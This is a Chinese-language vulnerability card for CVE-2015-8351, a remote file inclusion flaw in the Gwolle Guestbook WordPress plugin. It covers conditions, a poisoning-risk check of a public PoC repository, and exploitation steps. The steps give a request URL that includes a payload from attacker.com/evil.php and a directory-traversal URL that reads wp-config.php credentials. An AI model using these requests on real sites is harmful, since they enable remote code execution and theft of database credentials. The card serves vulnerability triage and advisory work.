## CVE-2015-8351-Gwolle Guestbook-RFI

**漏洞编号:** CVE-2015-8351

**漏洞类型:** 远程文件包含 (RFI)

**影响应用:** Gwolle Guestbook WordPress Plugin

**危害等级:** 高危，允许远程攻击者执行任意PHP代码。

**影响版本:** < 1.5.4

**利用条件:** 需要`allow_url_include`启用，或者能够利用目录遍历包含本地文件。需要目标安装了存在漏洞版本的Gwolle Guestbook插件

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2015-8351 是 Gwolle Guestbook WordPress 插件中小于 1.5.4 版本的远程文件包含漏洞。当 `allow_url_include` 启用时，攻击者可以通过 `abspath` 参数向 `frontend/captcha/ajaxresponse.php` 发送包含恶意 PHP 代码的 URL，从而执行任意 PHP 代码。即使 `allow_url_include` 未启用，也可以利用目录遍历序列包含和执行任意本地文件。

**有效性分析：**
根据漏洞描述和搜索结果，此漏洞是有效的。网上存在公开的漏洞利用代码。

**投毒风险分析：**
查看提供的 exploit.py 文件和 LICENSE 文件。LICENSE 声明软件进入公共领域，没有发现恶意代码。Exploit.py 脚本实现了发送恶意请求的功能，用于测试目标 URL 是否存在漏洞，如果存在，则通过构造包含恶意代码的 URL 来利用漏洞。该脚本本身是漏洞利用工具，不属于投毒。

**利用方式：**
1.  **检查目标系统是否安装了 Gwolle Guestbook WordPress 插件，并且版本低于 1.5.4。**
2.  **确定 `frontend/captcha/ajaxresponse.php` 文件的可访问 URL。**
3.  **如果 `allow_url_include` 已启用：**
    *   构造一个包含恶意 PHP 代码的 URL。例如：`http://attacker.com/evil.php`，其中 `evil.php` 包含要执行的 PHP 代码。
    *   向 `frontend/captcha/ajaxresponse.php` 发送包含 `abspath` 参数的 HTTP 请求，并将 `abspath` 参数的值设置为包含恶意 PHP 代码的 URL。例如：`targetURL/wp-content/plugins/gwolle-gb/frontend/captcha/ajaxresponse.php?abspath=http://attacker.com/evil.php`。
4.  **如果 `allow_url_include` 未启用：**
    *   尝试使用目录遍历序列（例如 `../../../../`) 来包含本地文件。例如，包含 WordPress 的 `wp-config.php` 文件，可能泄露数据库凭据。`targetURL/wp-content/plugins/gwolle-gb/frontend/captcha/ajaxresponse.php?abspath=../../../../../wp-config.php`

**注意：** 成功的利用需要目标系统满足特定的条件，例如 `allow_url_include` 启用或者存在可利用的本地文件。

**项目地址:** [Philip-Otter/CVE-2015-8351_Otter_Remix](https://github.com/Philip-Otter/CVE-2015-8351_Otter_Remix)

**漏洞详情:** [CVE-2015-8351](https://nvd.nist.gov/vuln/detail/CVE-2015-8351)